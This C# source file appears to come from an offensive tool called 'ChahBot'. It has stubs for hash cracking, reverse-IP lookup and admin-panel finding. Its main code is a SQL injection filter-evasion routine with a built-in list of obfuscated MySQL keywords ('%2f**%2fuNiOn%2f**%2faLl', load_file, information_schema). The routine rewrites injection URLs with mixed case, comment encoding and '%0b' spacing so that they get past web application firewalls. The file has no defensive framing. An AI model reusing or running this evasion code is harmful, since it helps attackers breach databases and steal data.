using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ChahBot_1_0_Gacy.Src
{
    class G_Tools
    {
        private enum enCharacterCasing : byte
        {
	        None,
	        upper,
	        LOWER
        }

        private enum CrackSite : byte
        {
	        md5_rednoize_com,
	        md5_hashcracking_com,
	        md5decryption_com,
	        hashchecker_com
        }
        private enum ReverseIPSite : byte
        {
	        whois_webhosting_info,
	        pagesinventory_com
        }
        private struct stReverseIP
        {
	        public string IP;

	        public ReverseIPSite Type;
        }
        private struct stGetData
        {
	        public int TimeOut;

	        public string URL;

	        public ArrayList colDic;

	        public int Threads;

	        public NetworkCredential Credentials;

	        public enCharacterCasing CharacterCasing;

	        public string Extention;

	        public object Tag;

	        public bool StopScannDetected;
        }
        private delegate void DAddListItem(object o);
        private delegate void DAdd(string Url, string sError, string sStatus, string sResponseTime);
        private class ThreadAdminFind
        {
	        private int __ID;

	        private Thread __Thread;

	        private string __Url;

	        public Thread Thread
	        {
		        get
		        {
			        return this.__Thread;
		        }
		        set
		        {
			        this.__Thread = value;
		        }
	        }

	        public string Url
	        {
		        get
		        {
			        return this.__Url;
		        }
		        set
		        {
			        this.__Url = value;
		        }
	        }

	        public ThreadAdminFind(int id)
	        {
		        this.__ID = id;
	        }
        }

        private stGetData __GetData = new stGetData();
	    private bool __RunningWAdminLFind;
	    private static ThreadPool __ThreadPoolAdminLFind;
	    private int __AdminFound;
	    private bool __RunningHashCrack;
	    private bool __RunningReverseIP;
	    private Hashtable __ReverseIPResponse = new Hashtable();
	    private bool __AboutMusic;
	    private string MYSQL_KEY_WORDS;
	    private Dictionary<string, TextBox>[] __MySQLKeyWords;
        private List<string> __MySQLKeyWordsNone = new List<string>()
        {
            "%2f**%2fuNiOn%2f**%2faLl",
            "%2f**%2fdIsTiNcT",
            "%2f**%2fwHeRe",
            "%2f**%2foRdEr%2f**%2fbY",
            "%2f**%2fsUbStRiNg(",
            "%2f**%2fcOnCaT_Ws(",
            "%2f**%2flOaD_FiLe(",
            "%2f**%2fcAsT(",
            "%2f**%2fuNhEx(",
            "%2f**%2fsYsTeM_UsEr",
            "%2f**%2f@@vErSiOn",
            "%2f**%2fdB_NaMe()",
            "%2f**%2f`InFoRmAtIoN_ScHeMa`",
            "%2f**%2fsChEmA_NaMe",
            "%2f**%2ftAbLe_nAmE",
            "%2f**%2fcOlUmNs",
            "%2f**%2fcOlUmN_ScHeMa",
            "%2f**%2fsYsDaTaBaSeS",
            "%2f**%2fsYsCoLuMnS",
            "%2f**%2fsElEcT",
            "%2f**%2ffRoM",
            "%2f**%2flImIt",
            "%2f**%2fgRoUp%2f**%2fbY",
            "%2f**%2fcOnCaT(",
            "%2f**%2fgRoUp_cOnCaT(",
            "%2f**%2fcOnVeRt(",
            "%2f**%2fhEx(",
            "%2f**%2fuSeR()",
            "%2f**%2fvErSiOn()",
            "%2f**%2fdAtAbAsE()",
            "%2f**%2fmYsQl",
            "%2f**%2fsChEmAtA",
            "%2f**%2ftAbLeS",
            "%2f**%2ftAbLe_sChEmA",
            "%2f**%2fcOlUmN_NaMe",
            "%2f**%2fmAsTeR",
            "%2f**%2fsYsObJeCtS"
        };
	    private int __WAFS = 2; // WAF !!!!
	    private StaticLocalInitFlag SetLoadByPassObjects_Index_Init;
	    private int SetLoadByPassObjects_Index;

        public G_Tools()
        {
            this.__AboutMusic = false;
            this.MYSQL_KEY_WORDS = "union all;select;distinct;from;where;limit;order by;group by;substring(;concat(;concat_ws(;group_concat(;load_file(;convert(;cast(;hex(;unhex(;user();system_user;version();@@version;database();DB_NAME();mysql;`information_schema`;schemata;schema_name;tables;table_name;table_schema;columns;column_name;column_schema;master;sysdatabases;sysobjects;syscolumns";
            this.__MySQLKeyWords = new Dictionary<string, TextBox>[2];
            IniByPassKeywords();
        }
        private void IniByPassKeywords()
        {
            checked
            {
                try
                {
                    bool flag = true;
                    this.__MySQLKeyWords[0] = new Dictionary<string, TextBox>();
                    this.__MySQLKeyWords[1] = new Dictionary<string, TextBox>();
                    this.__MySQLKeyWordsNone = new List<string>();
                    string[] array3 = this.MYSQL_KEY_WORDS.Split(new char[]
				    {
					    ';'
				    });
                    for (int i = 0; i < array3.Length; i++)
                    {
                        string text = array3[i];
                        if (!(string.IsNullOrEmpty(text) | this.__MySQLKeyWordsNone.Contains(text)))
                        {
                            if (flag)
                            {
                                this.__MySQLKeyWords[0].Add(text, this.SetLoadByPassObjects(text));
                                this.__MySQLKeyWords[1].Add(text, this.SetLoadByPassObjects(text));
                                flag = false;
                            }
                            else
                            {
                                this.__MySQLKeyWords[0].Add(text, this.SetLoadByPassObjects(text));
                                this.__MySQLKeyWords[1].Add(text, this.SetLoadByPassObjects(text));
                                flag = true;
                            }
                            this.__MySQLKeyWordsNone.Add(text);
                        }
                    }
                }
                catch (Exception expr_253)
                {
                    ProjectData.SetProjectError(expr_253);
                    Exception ex = expr_253;
                    MessageBox.Show(ex.ToString());
                    ProjectData.ClearProjectError();
                }
                btnSQLiByPass_Click();
                btnSQLiWaf_Click();
            }
        }

        private TextBox SetLoadByPassObjects(string sText)
	    {
		    TextBox textBox = new TextBox();
		    textBox.Name = "lblOfsKeyFake";
		    Control arg_92_0 = textBox;
		    checked
		    {
			    if (sText.EndsWith("("))
			    {
				    textBox.Text = sText.Substring(0, sText.Length - 1).ToUpper();
			    }
			    else
			    {
				    textBox.Text = sText.ToUpper();
			    }
			    textBox.TextAlign = HorizontalAlignment.Right;
			    textBox.ReadOnly = true;
			    textBox.BorderStyle = BorderStyle.None;
			    TextBox textBox2 = new TextBox();
			    textBox2.Name = "lblOfsKeyFake";
			    Control arg_127_0 = textBox2;
			    textBox2.Text = sText.ToUpper();
			    textBox2.Tag = sText;
			    return textBox2;
		    }
	    }

        private void btnSQLiByPass_Click()
        {
            checked
            {
                try
                {
                    Dictionary<string, TextBox>.Enumerator enumerator = this.__MySQLKeyWords[0].GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        KeyValuePair<string, TextBox> current = enumerator.Current;
                        StringBuilder stringBuilder = new StringBuilder();
                        bool flag = false;
                        int arg_3D_0 = 0;
                        int num = current.Key.Length - 1;
                        for (int i = arg_3D_0; i <= num; i++)
                        {
                            if (flag)
                            {
                                flag = false;
                                stringBuilder.Append(current.Key.Substring(i, 1).ToUpper());
                            }
                            else
                            {
                                flag = true;
                                stringBuilder.Append(current.Key.Substring(i, 1).ToLower());
                            }
                        }
                        current.Value.Text = stringBuilder.ToString();
                    }
                }
                finally
                {
                }
            }
        }

        private void btnSQLiWaf_Click()
        {
            checked
            {
                try
                {
                    Dictionary<string, TextBox>.Enumerator enumerator = this.__MySQLKeyWords[1].GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        KeyValuePair<string, TextBox> current = enumerator.Current;
                        StringBuilder stringBuilder = new StringBuilder();
                        bool flag = false;
                        int arg_3D_0 = 0;
                        int num = current.Key.Length - 1;
                        for (int i = arg_3D_0; i <= num; i++)
                        {
                            if (flag)
                            {
                                flag = false;
                                stringBuilder.Append(current.Key.Substring(i, 1).ToUpper());
                            }
                            else
                            {
                                flag = true;
                                stringBuilder.Append(current.Key.Substring(i, 1).ToLower());
                            }
                        }
                        bool flag2 = true;
                       /* if (true == (sender == this.btnSQLiWaf_1))
                        {*/
                            current.Value.Text = "%2f**%2f" + stringBuilder.ToString();
                            current.Value.Text = current.Value.Text.Replace(" ", "%2f**%2f");
                        /*}
                        else if (flag2 == (sender == this.btnSQLiWaf_2))
                        {
                            current.Value.Text = "%2f" + stringBuilder.ToString();
                            current.Value.Text = current.Value.Text.Replace(" ", "%2f");
                        }
                        else if (flag2 == (sender == this.btnSQLiWaf_3))
                        {
                            current.Value.Text = "/%2A%2A/" + stringBuilder.ToString();
                            current.Value.Text = current.Value.Text.Replace(" ", "/%2A%2A/");
                        }
                        else if (flag2 == (sender == this.btnSQLiWaf_4))
                        {
                            current.Value.Text = "%0b" + stringBuilder.ToString();
                            current.Value.Text = current.Value.Text.Replace(" ", "%0b");
                        }
                        else if (flag2 == (sender == this.btnSQLiWaf_5))
                        {
                            int startIndex = (int)Math.Round(Math.Round((double)current.Key.Length / 2.0, 0));
                            current.Value.Text = current.Key.Insert(startIndex, "%0b");
                        }*/
                    }
                }
                finally
                {
                }
            }
        }

        internal string ReplaceWorlds(string sImput, string sFind, string sReplace)
        {
            int length = sFind.Length;
            checked
            {
                int i = 0;
                while (i <= sImput.Length - 1)
                {
                    bool flag = false;
                    i = sImput.ToLower().IndexOf(sFind.ToLower(), i);
                    if (i <= 0)
                    {
                        break;
                    }
                    if (sFind.EndsWith("("))
                    {
                        flag = true;
                    }
                    else
                    {
                        string[] array = new string[2];
                        if (i + length + 1 >= sImput.Length)
                        {
                            array[0] = "";
                        }
                        else
                        {
                            array[0] = sImput.Substring(i + length, 1);
                        }
                        array[1] = sImput.Substring(i - 1, 1);
                        if ((Operators.CompareString(array[0], "", false) == 0 | Operators.CompareString(array[0], " ", false) == 0 | Operators.CompareString(array[0], ",", false) == 0 | Operators.CompareString(array[0], "=", false) == 0 | Operators.CompareString(array[0], "+", false) == 0 | Operators.CompareString(array[0], ")", false) == 0 | Operators.CompareString(array[0], "(", false) == 0 | Operators.CompareString(array[0], "]", false) == 0 | Operators.CompareString(array[0], "[", false) == 0 | Operators.CompareString(array[0], ".", false) == 0) & (Operators.CompareString(array[1], "", false) == 0 | Operators.CompareString(array[1], " ", false) == 0 | Operators.CompareString(array[1], ",", false) == 0 | Operators.CompareString(array[1], "=", false) == 0 | Operators.CompareString(array[1], "+", false) == 0 | Operators.CompareString(array[1], ")", false) == 0 | Operators.CompareString(array[1], "(", false) == 0 | Operators.CompareString(array[1], "]", false) == 0 | Operators.CompareString(array[1], "[", false) == 0 | Operators.CompareString(array[1], ".", false) == 0))
                        {
                            flag = true;
                        }
                    }
                    if (flag)
                    {
                        sImput = sImput.Remove(i, length);
                        sImput = sImput.Insert(i, sReplace);
                    }
                    i += sReplace.Length;
                }
                return sImput;
            }
        }

        internal void CheckSQLiStringOfuscation(ref string sURL)
        {
            int num = 0;
            switch (this.__WAFS)
            {
                case 0:
                    num = -1;
                    break;
                case 1:
                    num = 0;
                    break;
                case 2:
                    num = 1;
                    break;
            }
            sURL = sURL.Replace("/**//**/", "/**/");
            sURL = sURL.Replace("++", "+");
            sURL = sURL.Replace("----", "--");
            sURL = sURL.Replace("/**/", " ");
            sURL = sURL.Replace("%2f**%2f", " ");
            sURL = sURL.Replace("%2f", " ");
            sURL = sURL.Replace("  ", " ");
            sURL = sURL.Replace("/%2A%2A/", " ");
            sURL = sURL.Replace("%0b", " ");
            sURL = this.ReplaceWorlds(sURL, "unhex(", "|4nh3x(");
            sURL = this.ReplaceWorlds(sURL, "group_concat(", "|g_r0up_c0nc4t(");
            if (num == -1)
            {
                try
                {
                    List<string>.Enumerator enumerator = this.__MySQLKeyWordsNone.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        string current = enumerator.Current;
                        sURL = this.ReplaceWorlds(sURL, current, current);
                    }
                    goto IL_185;
                }
                finally
                {
                    List<string>.Enumerator enumerator = new List<string>.Enumerator();
                    ((IDisposable)enumerator).Dispose();
                }
            }
            try
            {
                Dictionary<string, TextBox>.Enumerator enumerator2 = this.__MySQLKeyWords[num].GetEnumerator();
                while (enumerator2.MoveNext())
                {
                    KeyValuePair<string, TextBox> current2 = enumerator2.Current;
                    sURL = this.ReplaceWorlds(sURL, current2.Key, current2.Value.Text);
                }
            }
            finally
            {
                Dictionary<string, TextBox>.Enumerator enumerator2 = new Dictionary<string, TextBox>.Enumerator();
                ((IDisposable)enumerator2).Dispose();
            }
        IL_185:
            int num2 = num;
            if (num2 == -1)
            {
                sURL = this.ReplaceWorlds(sURL, "|4nh3x(", this.__MySQLKeyWordsNone[this.__MySQLKeyWordsNone.IndexOf("unhex(")]);
                sURL = this.ReplaceWorlds(sURL, "|g_r0up_c0nc4t(", this.__MySQLKeyWordsNone[this.__MySQLKeyWordsNone.IndexOf("group_concat(")]);
            }
            else
            {
                sURL = this.ReplaceWorlds(sURL, "|4nh3x(", this.__MySQLKeyWords[num]["unhex("].Text);
                sURL = this.ReplaceWorlds(sURL, "|g_r0up_c0nc4t(", this.__MySQLKeyWords[num]["group_concat("].Text);
            }
            sURL = sURL.Replace("  ", " ");
            sURL = sURL.Replace(" (", "(");
            sURL = sURL.Replace("(+", "(");
            sURL = sURL.Replace(")(", ")+(");
            sURL = sURL.Replace("++", "+");
            if (!string.IsNullOrEmpty(global::Globals.URL_REPLACE_SPACES))
            {
                sURL = sURL.Replace(" ", global::Globals.URL_REPLACE_SPACES);
            }
            sURL = sURL.Trim();
        }


    }
}
